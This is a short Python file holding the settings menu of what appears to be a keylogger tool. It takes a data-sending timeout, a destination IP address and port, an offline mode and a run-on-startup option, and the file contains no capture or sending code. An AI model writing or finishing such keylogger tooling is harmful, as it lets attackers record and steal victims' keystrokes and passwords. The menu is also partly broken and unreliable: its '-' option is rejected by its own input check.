import os
from pystyle import Colors


def isNumber(n):
    try:
        int(n)
        return True
    except ValueError:
        return False


text = f"""
[0] Timeout when sending data
[1] IP address
[2] Port
[3] Offline keylogger
[4] Run this window on application startup


[-] Close settings and run the keylogger

[Enter] Exit{Colors.white}
> """
choice = input(text)

while not isNumber(choice) or int(choice) > 4 or int(choice) < 0:
    os.system("cls")
    print(f"{Colors.red}[!] Wrong choice{Colors.yellow}")
    choice = input(text)


if choice == "0":
    timeout = input("Timeout: ")
elif choice == "1":
    ipaddress = input("Enter ip address: ")
elif choice == "2":
    port = input("Enter a port: ")
elif choice == "3":
    print(f"{Colors.green}[i] Offline keylogger set")
elif choice == "4":
    print("Bob")

